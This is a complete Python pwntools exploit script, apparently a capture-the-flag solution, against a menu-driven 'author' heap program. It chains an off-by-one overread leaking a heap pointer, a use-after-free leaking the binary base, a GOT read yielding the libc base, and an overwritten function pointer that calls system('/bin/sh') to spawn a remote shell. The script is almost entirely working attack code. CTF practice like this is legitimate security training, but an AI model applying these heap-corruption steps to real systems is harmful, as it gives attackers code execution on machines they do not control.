from pwn import *
from pwnlib.util.packing import *
from pwnlib.util.packing import u64

from dataclasses import dataclass

IS_LOCAL = False
IS_DEBUG = True
ENABLE_ASLR = False

#INPUT_FILENAME = "auth-or-out"
INPUT_FILENAME = "auth-or-out_patched"
LIBC_FILENAME = "libc/libc6_2.27-3ubuntu1.4_amd64.so"

REMOTE_HOST = ""
REMOTE_PORT = 31328

context.terminal = ['tmux', 'new-window']

LOCAL_IMAGE_BASE = 0x00555555400000

if IS_LOCAL:
    if IS_DEBUG:
        io = process(INPUT_FILENAME, aslr=ENABLE_ASLR)
        pid, io_gdb = gdb.attach(io, api=True, gdbscript="""
            continue
        """)

    else:
        io = process(INPUT_FILENAME)
else:
    io = remote(REMOTE_HOST, REMOTE_PORT)

@dataclass
class Author:
    Name: bytes = b''
    SurName: bytes = b''
    Age: bytes = b'-1'
    NoteSize: bytes = b'0'
    Note: bytes = b''

def add_author(info: Author = Author()) -> int:
    log.info('Adding author...')

    io.recvuntil(b'Choice: ')
    io.sendline(b'1')

    io.recvuntil(b'Name: ')
    io.sendline(info.Name)

    io.recvuntil(b'Surname: ')
    io.sendline(info.SurName)

    io.recvuntil(b'Age: ')
    io.sendline(info.Age)

    io.recvuntil(b'Author Note size: ')
    io.sendline(info.NoteSize)

    if info.NoteSize != b'0':
        io.recvuntil(b'Note: ')
        io.sendline(info.Note)

    res = io.recvuntil(b'added!').split(b' ')

    return int(res[-2], 10)

def delete_author(id: bytes) -> None:
    io.info(f'Deleting author...')

    io.recvuntil(b'Choice: ')
    io.sendline(b'4')

    io.recvuntil(b'Author ID: ')
    io.sendline(id)

def print_author(id: bytes) -> None:
    io.info('Printing author\'s information...')

    io.recvuntil(b'Choice: ')
    io.sendline(b'3')

    io.recvuntil(b'Author ID: ')
    io.sendline(id)

def modify_author(id: bytes, info: Author) -> None:
    io.info('Changing author\'s data...')

    io.recvuntil(b'Choice: ')
    io.sendline(b'2')

    io.recvuntil(b'Author ID: ')
    io.sendline(id)

    io.recvuntil(b'Name: ')
    io.sendline(info.Name)

    io.recvuntil(b'Surname: ')
    io.sendline(info.SurName)

    io.recvuntil(b'Age: ')
    io.sendline(info.Age)

def get_heap_leak() -> int:
    log.info('Trying to get heap address...')

    # adding a dummy author with note's pointer
    add_author(Author(b'', b'', b'-1', b'1', b''))

    """
    Overwrite a NULL-byte at the end using the length bug:
        printf("Surname: ");
        get_from_user(a->Surname, 0x11uLL);
    """
    modify_author(b'1', Author(b'', b'c'*16))

    # printing surname without a NULL-byte
    print_author(b'1')

    # parsing result
    leak = io.recvline_contains(b'c'*16)
    leak = leak.split(b'c'*16)[1].ljust(8, b'\0')

    # no need him anymore
    delete_author(b'1')

    return u64(leak)

def get_binary_leak() -> int:
    log.info('Trying to get binary base...')

    # adding dummy authors to write address to 'print' function to the heap
    add_author()
    add_author()

    # these functions do not clear the heap's data
    delete_author(b'2')
    delete_author(b'1')

    # lean note to the address of the custom 'print' function
    add_author(Author(b'', b'', b'-1', b'48', b'a'*48))

    # print note to get a leak
    print_author(b'1')

    # parsing result
    leak = io.recvline_contains(b'a'*48)
    leak = leak.split(b'a'*48)[1].rstrip(b']').ljust(8, b'\0')

    # no need him anymore
    delete_author(b'1')

    return u64(leak)

def prepare_exploit(p_heap: int) -> None:
    log.info('Prepare heap layout to take control over a RIP...')

    # help to modify the 2nd author
    add_author()

    # help to free the 3rd author through note's pointer, but keep pointer in
    # the author's array
    add_author()

    # help to take control over the RIP using a custom 'print' function
    add_author()

    delete_author(b'2')
    delete_author(b'1')

    # overwrite the 2nd author's note pointer by the one points to the 3rd
    # author
    payload = flat(
        {
            32: p_heap
        },
        word_size = 64
    )
    add_author(Author(b'', b'', b'-1', str(len(payload)).encode(), payload))

    delete_author(b'1')

    # only to align memory
    add_author()

    # the 2nd author added without a note, but address is already there
    add_author()

    # free the 2nd and(!!!) the 3rd author, cuz note pointed to the 3rd
    delete_author(b'2')

    log.info('Hopefully layout is ready to execute exploit...')

def get_libc_leak(p_note: int, p_func: int) -> int:
    log.info('Trying to get LIBC address...')

    payload = flat(
        {
            32: p_note,
            48: p_func
        },
        word_size = 64,
        filler = b'\0'
    )
    add_author(Author(b'', b'', b'-1', str(len(payload)).encode(), payload))

    # execute function
    print_author(b'3')

    # parsing result
    leak = io.recvline_contains(b'Note: [')
    leak = leak.split(b'Note: [')[1].rstrip(b']').ljust(8, b'\0')

    # no need him anymore
    delete_author(b'2')

    return u64(leak)

def execute_system(p_cmd: int, p_system: int) -> None:
    log.info('Trying to get shell...')

    payload = flat(
        {
            0: b'/bin/sh',
            32: p_cmd,
            48: p_system
        },
        word_size = 64,
        filler = b'\0'
    )
    add_author(Author(b'', b'', b'-1', str(len(payload)).encode(), payload))

    # execute function
    print_author(b'3')

leak_heap_address = get_heap_leak()
log.success(f'Leaked heap address: {hex(leak_heap_address)}')

leak_binary_address = get_binary_leak()
log.success(f'Leaked binary address: {hex(leak_binary_address)}')

image_base_offset = 0x555555401219 - LOCAL_IMAGE_BASE
image_base = leak_binary_address - image_base_offset
log.success(f'Binary base address: {hex(image_base)}')

LOCAL_HEAP_LEAK = 0x7fffffffa978
LOCAL_TARGET_ADDR = 0x7fffffffa9b0
TARGET_HEAP_OFFSET = LOCAL_TARGET_ADDR - LOCAL_HEAP_LEAK
TARGET_HEAP = leak_heap_address + TARGET_HEAP_OFFSET
prepare_exploit(TARGET_HEAP)

elf = ELF(INPUT_FILENAME)
p_got_read = image_base + elf.got['read']
#p_got_read = image_base + elf.got['puts']
log.info(f'Address of the \'read\' function in binary: {hex(p_got_read)}')

# libc6_2.27-3ubuntu1.4_amd64
# https://libc.blukat.me/d/libc6_2.27-3ubuntu1.4_amd64.so

leak_libc_address = get_libc_leak(p_got_read, leak_binary_address)
log.success(f'Leaked LIBC \'read\' address: {hex(leak_libc_address)}')

libc = ELF(LIBC_FILENAME)
libc_base = leak_libc_address - libc.symbols['read']
log.success(f'LIBC base address: {hex(libc_base)}')

system_addr = libc_base + libc.symbols['system']
execute_system(TARGET_HEAP, system_addr)

log.success('Hope, you can have a fun now!')
io.interactive()
